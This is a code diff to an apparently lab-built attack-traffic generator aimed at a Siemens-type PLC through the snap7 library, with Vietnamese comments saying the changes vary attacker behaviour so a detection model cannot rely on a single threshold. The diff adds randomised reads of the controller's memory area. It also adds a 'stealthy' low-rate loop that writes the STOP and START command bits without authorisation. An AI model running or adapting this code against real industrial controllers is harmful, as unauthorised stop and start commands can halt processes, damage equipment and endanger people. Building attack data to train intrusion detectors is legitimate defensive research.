@@ -774,7 +774,21 @@ while True:
     try:
         if not c.get_connected():
             c.connect(target, rack, slot)
-        m = c.read_area(Areas.MK, 0, 0, 80)
+        if profile == "diverse_mix" and random.random() < 0.4:
+            # Attacker tinh khon hon co the doc tung doan nho thay vi luon
+            # doc tron 80 byte 1 lan -- gia tri "do dai request" khong con
+            # co dinh =80 nua, tranh model chi dua vao dung 1 nguong nay.
+            ln = random.randint(8, 80)
+            off = random.randint(0, 80 - ln)
+            _chunk = c.read_area(Areas.MK, 0, off, ln)
+            # Dat lai dung vi tri tuyet doi trong 1 buffer 80 byte de dong
+            # log ben duoi (m[5]/m[6]/get_dint(m,54)) khong bao gio loi index
+            # -- day CHI la buffer hien thi/log, khong anh huong lan doc that
+            # da xay ra o dong tren.
+            m = bytearray(80)
+            m[off:off + ln] = _chunk
+        else:
+            m = c.read_area(Areas.MK, 0, 0, 80)
         try:
             q = c.read_area(Areas.PA, 0, 0, 1)
             q0 = q[0]
@@ -1066,7 +1080,7 @@ else:
     sleep_range = (1.5, 3.0)
 c = snap7.client.Client()
 n = 0
-print(f"[STEALTHY] low-rate STOP writes on M5.1 profile={profile} sleep={sleep_range}", flush=True)
+print(f"[STEALTHY] low-rate command-bit writes on M5.0/M5.1 profile={profile} sleep={sleep_range}", flush=True)
 while True:
     try:
         if not c.get_connected():
@@ -1074,8 +1088,16 @@ while True:
         m5 = c.read_area(Areas.MK, 0, 5, 1)
         old_stop = get_bool(m5, 0, 1)
         old_start = get_bool(m5, 0, 0)
-        set_bool(m5, 0, 1, True)
-        set_bool(m5, 0, 0, False)
+        # diverse_mix: thinh thoang chi bat START thay vi luon STOP -- van
+        # CHI 2 bit lenh da biet an toan (M5.0/M5.1), khong doi dia chi;
+        # ca 2 deu la "ghi lenh trai phep tan suat cuc thap", chi khac bit
+        # nao duoc bat.
+        if profile == "diverse_mix" and random.random() < 0.5:
+            set_bool(m5, 0, 0, True)
+            set_bool(m5, 0, 1, False)
+        else:
+            set_bool(m5, 0, 1, True)
+            set_bool(m5, 0, 0, False)
         new_stop = get_bool(m5, 0, 1)
         new_start = get_bool(m5, 0, 0)
         c.write_area(Areas.MK, 0, 5, m5)
